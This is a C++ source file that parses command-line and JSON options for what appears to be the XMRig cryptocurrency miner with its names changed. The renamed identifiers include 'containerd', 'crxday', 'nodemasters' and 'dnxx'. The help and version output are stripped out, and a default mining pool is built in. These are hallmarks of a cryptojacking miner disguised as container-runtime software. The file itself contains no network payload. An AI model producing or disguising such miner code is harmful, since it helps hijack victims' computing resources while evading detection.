#include <string.h>
#include <uv.h>


#ifdef _MSC_VER
#   include "getopt/getopt.h"
#else
#   include <getopt.h>
#endif


#ifndef containerd_NO_HTTPD
#   include <microhttpd.h>
#endif


#include "Cpu.h"
#include "dnxx.h"
#include "net/Url.h"
#include "Options.h"
#include "Platform.h"
#include "rapidjson/document.h"
#include "rapidjson/error/en.h"
#include "rapidjson/filereadstream.h"
#include "version.h"
#include "containerd.h"


#ifndef ARRAY_SIZE
#   define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
#endif


Options *Options::m_self = nullptr;

static char const short_options[] = "a:c:khBp:Px:r:R:s:t:T:o:u:O:v:Vl:S";


static struct option const options[] = {
    { "algo",             1, nullptr, 'a'  },
    { "api-access-token", 1, nullptr, 4001 },
    { "api-port",         1, nullptr, 4000 },
    { "api-worker-id",    1, nullptr, 4002 },
    { "av",               1, nullptr, 'v'  },
    { "background",       0, nullptr, 'B'  },
    { "config",           1, nullptr, 'c'  },
    { "cpu-affinity",     1, nullptr, 1020 },
    { "cpu-priority",     1, nullptr, 1021 },
    { "dnxx-level",     1, nullptr, 1003 },
    { "dry-run",          0, nullptr, 5000 },
    { "help",             0, nullptr, 'h'  },
    { "keepalive",        0, nullptr ,'k'  },
    { "log-file",         1, nullptr, 'l'  },
    { "max-cpu-usage",    1, nullptr, 1004 },
    { "nhserver",         0, nullptr, 1006 },
    { "no-color",         0, nullptr, 1002 },
    { "no-huge-pages",    0, nullptr, 1009 },
    { "variant",          1, nullptr, 1010 },
    { "pass",             1, nullptr, 'p'  },
    { "print-time",       1, nullptr, 1007 },
    { "retries",          1, nullptr, 'r'  },
    { "retry-pause",      1, nullptr, 'R'  },
    { "safe",             0, nullptr, 1005 },
    { "syslog",           0, nullptr, 'S'  },
    { "threads",          1, nullptr, 't'  },
    { "url",              1, nullptr, 'o'  },
    { "user",             1, nullptr, 'u'  },
    { "user-agent",       1, nullptr, 1008 },
    { "userpass",         1, nullptr, 'O'  },
    { "version",          0, nullptr, 'V'  },
    { 0, 0, 0, 0 }
};


static struct option const config_options[] = {
    { "algo",          1, nullptr, 'a'  },
    { "av",            1, nullptr, 'v'  },
    { "background",    0, nullptr, 'B'  },
    { "colors",        0, nullptr, 2000 },
    { "cpu-affinity",  1, nullptr, 1020 },
    { "cpu-priority",  1, nullptr, 1021 },
    { "dnxx-level",  1, nullptr, 1003 },
    { "dry-run",       0, nullptr, 5000 },
    { "huge-pages",    0, nullptr, 1009 },
    { "log-file",      1, nullptr, 'l'  },
    { "max-cpu-usage", 1, nullptr, 1004 },
    { "print-time",    1, nullptr, 1007 },
    { "retries",       1, nullptr, 'r'  },
    { "retry-pause",   1, nullptr, 'R'  },
    { "safe",          0, nullptr, 1005 },
    { "syslog",        0, nullptr, 'S'  },
    { "threads",       1, nullptr, 't'  },
    { "user-agent",    1, nullptr, 1008 },
    { 0, 0, 0, 0 }
};


static struct option const nodemaster_options[] = {
    { "url",           1, nullptr, 'o'  },
    { "pass",          1, nullptr, 'p'  },
    { "user",          1, nullptr, 'u'  },
    { "userpass",      1, nullptr, 'O'  },
    { "keepalive",     0, nullptr ,'k'  },
    { "variant",       1, nullptr, 1010 },
    { "nhserver",      0, nullptr, 1006 },
    { 0, 0, 0, 0 }
};


static struct option const api_options[] = {
    { "port",          1, nullptr, 4000 },
    { "access-token",  1, nullptr, 4001 },
    { "worker-id",     1, nullptr, 4002 },
    { 0, 0, 0, 0 }
};


static const char *algo_names[] = {
    "crxday",
#   ifndef containerd_NO_noway
    "crxday-lite"
#   endif
};


Options *Options::parse(int argc, char **argv)
{
    Options *options = new Options(argc, argv);
    if (options->isReady()) {
        m_self = options;
        return m_self;
    }

    delete options;
    return nullptr;
}


const char *Options::algoName() const
{
    return algo_names[m_algo];
}


Options::Options(int argc, char **argv) :
    m_background(false),
    m_colors(true),
    m_doublehxsh(false),
    m_dryRun(false),
    m_hugePages(true),
    m_ready(false),
    m_safe(false),
    m_syslog(false),
    m_apiToken(nullptr),
    m_apiWorkerId(nullptr),
    m_logFile(nullptr),
    m_userAgent(nullptr),
    m_algo(0),
    m_algoVariant(0),
    m_apiPort(0),
    m_dnxxLevel(kdnxxLevel),
    m_maxCpuUsage(75),
    m_printTime(60),
    m_priority(-1),
    m_retries(5),
    m_retryPause(5),
    m_threads(0),
    m_affinity(-1L)
{
    m_nodemasters.push_back(new Url(Url::kDefaultHost, Url::kDefaultPort, Url::kDefaultUser, Url::kDefaultPassword));


    int key;

    while (1) {
        key = getopt_long(argc, argv, short_options, options, NULL);
        if (key < 0) {
            break;
        }

        if (!parseArg(key, optarg)) {
            return;
        }
    }

    if (optind < argc) {

        return;
    }

    if (!m_nodemasters[0]->isValid()) {
        parseConfig(Platform::defaultConfigName());
    }

    if (!m_nodemasters[0]->isValid()) {
        return;
    }

    m_algoVariant = getAlgoVariant();
    if (m_algoVariant == AV2_AESNI_DOUBLE || m_algoVariant == AV4_SOFT_AES_DOUBLE) {
        m_doublehxsh = true;
    }

    if (!m_threads) {
        m_threads = Cpu::optimalThreadsCount(m_algo, m_doublehxsh, m_maxCpuUsage);
    }
    else if (m_safe) {
        const int count = Cpu::optimalThreadsCount(m_algo, m_doublehxsh, m_maxCpuUsage);
        if (m_threads > count) {
            m_threads = count;
        }
    }

    adjust();

    m_ready = true;
}


Options::~Options()
{
}


bool Options::getJSON(const char *fileName, rapidjson::Document &doc)
{
    uv_fs_t req;
    const int fd = uv_fs_open(uv_default_loop(), &req, fileName, O_RDONLY, 0644, nullptr);
    if (fd < 0) {
        return false;
    }

    uv_fs_req_cleanup(&req);

    FILE *fp = fdopen(fd, "rb");
    char buf[8192];
    rapidjson::FileReadStream is(fp, buf, sizeof(buf));

    doc.ParseStream(is);

    uv_fs_close(uv_default_loop(), &req, fd, nullptr);
    uv_fs_req_cleanup(&req);

    if (doc.HasParseError()) {
        return false;
    }

    return doc.IsObject();
}


bool Options::parseArg(int key, const char *arg)
{
    switch (key) {
    case 'a': /* --algo */
        if (!setAlgo(arg)) {
            return false;
        }
        break;

    case 'o': /* --url */
        if (m_nodemasters.size() > 1 || m_nodemasters[0]->isValid()) {
            Url *url = new Url(arg);
            if (url->isValid()) {
                m_nodemasters.push_back(url);
            }
            else {
                delete url;
            }
        }
        else {
            m_nodemasters[0]->parse(arg);
        }

        if (!m_nodemasters.back()->isValid()) {
            return false;
        }
        break;

    case 'O': /* --userpass */
        if (!m_nodemasters.back()->setUserpass(arg)) {
            return false;
        }
        break;

    case 'u': /* --user */
        m_nodemasters.back()->setUser(arg);
        break;

    case 'p': /* --pass */
        m_nodemasters.back()->setPassword(arg);
        break;

    case 'l': /* --log-file */
        free(m_logFile);
        m_logFile = strdup(arg);
        m_colors = false;
        break;

    case 4001: /* --access-token */
        free(m_apiToken);
        m_apiToken = strdup(arg);
        break;

    case 4002: /* --worker-id */
        free(m_apiWorkerId);
        m_apiWorkerId = strdup(arg);
        break;

    case 'r':  /* --retries */
    case 'R':  /* --retry-pause */
    case 'v':  /* --av */
    case 1003: /* --dnxx-level */
    case 1004: /* --max-cpu-usage */
    case 1007: /* --print-time */
    case 1021: /* --cpu-priority */
    case 4000: /* --api-port */
    case 1010: /* --variant */
        return parseArg(key, strtol(arg, nullptr, 10));

    case 'B':  /* --background */
    case 'k':  /* --keepalive */
    case 'S':  /* --syslog */
    case 1005: /* --safe */
    case 1006: /* --nhserver */
    case 5000: /* --dry-run */
        return parseBoolean(key, true);

    case 1002: /* --no-color */
    case 1009: /* --no-huge-pages */
        return parseBoolean(key, false);

    case 't':  /* --threads */
        if (strncmp(arg, "all", 3) == 0) {
            m_threads = Cpu::threads();
            return true;
        }

        return parseArg(key, strtol(arg, nullptr, 10));

    case 'V': /* --version */
        showVersion();
        return false;

    case 'h': /* --help */
        showUsage(0);
        return false;

    case 'c': /* --config */
        parseConfig(arg);
        break;

    case 1020: { /* --cpu-affinity */
            const char *p  = strstr(arg, "0x");
            return parseArg(key, p ? strtoull(p, nullptr, 16) : strtoull(arg, nullptr, 10));
        }

    case 1008: /* --user-agent */
        free(m_userAgent);
        m_userAgent = strdup(arg);
        break;

    default:
        showUsage(1);
        return false;
    }

    return true;
}


bool Options::parseArg(int key, uint64_t arg)
{
    switch (key) {
        case 'r': /* --retries */
        if (arg < 1 || arg > 1000) {
            showUsage(1);
            return false;
        }

        m_retries = (int) arg;
        break;

    case 'R': /* --retry-pause */
        if (arg < 1 || arg > 3600) {
            showUsage(1);
            return false;
        }

        m_retryPause = (int) arg;
        break;

    case 't': /* --threads */
        if (arg < 1 || arg > 1024) {
            showUsage(1);
            return false;
        }

        m_threads = (int) arg;
        break;

    case 'v': /* --av */
        if (arg > 1000) {
            showUsage(1);
            return false;
        }

        m_algoVariant = (int) arg;
        break;

    case 1003: /* --dnxx-level */
        if (arg < 1 || arg > 99) {
            return true;
        }

        m_dnxxLevel = (int) arg;
        break;

    case 1004: /* --max-cpu-usage */
        if (arg < 1 || arg > 100) {
            showUsage(1);
            return false;
        }

        m_maxCpuUsage = (int) arg;
        break;

    case 1007: /* --print-time */
        if (arg > 1000) {
            showUsage(1);
            return false;
        }

        m_printTime = (int) arg;
        break;

    case 1010: /* --variant */
        m_nodemasters.back()->setVariant((int) arg);
        break;

    case 1020: /* --cpu-affinity */
        if (arg) {
            m_affinity = arg;
        }
        break;

    case 1021: /* --cpu-priority */
        if (arg <= 5) {
            m_priority = (int) arg;
        }
        break;

    case 4000: /* --api-port */
        if (arg <= 65536) {
            m_apiPort = (int) arg;
        }
        break;

    default:
        break;
    }

    return true;
}


bool Options::parseBoolean(int key, bool enable)
{
    switch (key) {
    case 'k': /* --keepalive */
        m_nodemasters.back()->setKeepAlive(enable);
        break;

    case 'B': /* --background */
        m_background = enable;
        m_colors = enable ? false : m_colors;
        break;

    case 'S': /* --syslog */
        m_syslog = enable;
        m_colors = enable ? false : m_colors;
        break;

    case 1002: /* --no-color */
        m_colors = enable;
        break;

    case 1005: /* --safe */
        m_safe = enable;
        break;

    case 1006: /* --nhserver */
        m_nodemasters.back()->setnhserver(enable);
        break;

    case 1009: /* --no-huge-pages */
        m_hugePages = enable;
        break;

    case 2000: /* colors */
        m_colors = enable;
        break;

    case 5000: /* --dry-run */
        m_dryRun = enable;
        break;

    default:
        break;
    }

    return true;
}


Url *Options::parseUrl(const char *arg) const
{
    auto url = new Url(arg);
    if (!url->isValid()) {
        delete url;
        return nullptr;
    }

    return url;
}


void Options::adjust()
{
    for (Url *url : m_nodemasters) {
        url->adjust(m_algo);
    }
}


void Options::parseConfig(const char *fileName)
{
    rapidjson::Document doc;
    if (!getJSON(fileName, doc)) {
        return;
    }

    for (size_t i = 0; i < ARRAY_SIZE(config_options); i++) {
        parseJSON(&config_options[i], doc);
    }

    const rapidjson::Value &nodemasters = doc["nodemasters"];
    if (nodemasters.IsArray()) {
        for (const rapidjson::Value &value : nodemasters.GetArray()) {
            if (!value.IsObject()) {
                continue;
            }

            for (size_t i = 0; i < ARRAY_SIZE(nodemaster_options); i++) {
                parseJSON(&nodemaster_options[i], value);
            }
        }
    }

    const rapidjson::Value &api = doc["api"];
    if (api.IsObject()) {
        for (size_t i = 0; i < ARRAY_SIZE(api_options); i++) {
            parseJSON(&api_options[i], api);
        }
    }
}


void Options::parseJSON(const struct option *option, const rapidjson::Value &object)
{
    if (!option->name || !object.HasMember(option->name)) {
        return;
    }

    const rapidjson::Value &value = object[option->name];

    if (option->has_arg && value.IsString()) {
        parseArg(option->val, value.GetString());
    }
    else if (option->has_arg && value.IsInt64()) {
        parseArg(option->val, value.GetUint64());
    }
    else if (!option->has_arg && value.IsBool()) {
        parseBoolean(option->val, value.IsTrue());
    }
}


void Options::showUsage(int status) const
{
    if (status) {

    }
    else {

    }
}


void Options::showVersion()
{
 
}


bool Options::setAlgo(const char *algo)
{
    for (size_t i = 0; i < ARRAY_SIZE(algo_names); i++) {
        if (algo_names[i] && !strcmp(algo, algo_names[i])) {
            m_algo = (int) i;
            break;
        }

#       ifndef containerd_NO_noway
        if (i == ARRAY_SIZE(algo_names) - 1 && !strcmp(algo, "crxday-light")) {
            m_algo = containerd::ALGO_crxday_LITE;
            break;
        }
#       endif

        if (i == ARRAY_SIZE(algo_names) - 1) {
            showUsage(1);
            return false;
        }
    }

    return true;
}


int Options::getAlgoVariant() const
{
#   ifndef containerd_NO_noway
    if (m_algo == containerd::ALGO_crxday_LITE) {
        return getAlgoVariantLite();
    }
#   endif

    if (m_algoVariant <= AV0_AUTO || m_algoVariant >= AV_MAX) {
        return Cpu::hasAES() ? AV1_AESNI : AV3_SOFT_AES;
    }

    if (m_safe && !Cpu::hasAES() && m_algoVariant <= AV2_AESNI_DOUBLE) {
        return m_algoVariant + 2;
    }

    return m_algoVariant;
}


#ifndef containerd_NO_noway
int Options::getAlgoVariantLite() const
{
    if (m_algoVariant <= AV0_AUTO || m_algoVariant >= AV_MAX) {
        return Cpu::hasAES() ? AV2_AESNI_DOUBLE : AV4_SOFT_AES_DOUBLE;
    }

    if (m_safe && !Cpu::hasAES() && m_algoVariant <= AV2_AESNI_DOUBLE) {
        return m_algoVariant + 2;
    }

    return m_algoVariant;
}
#endif
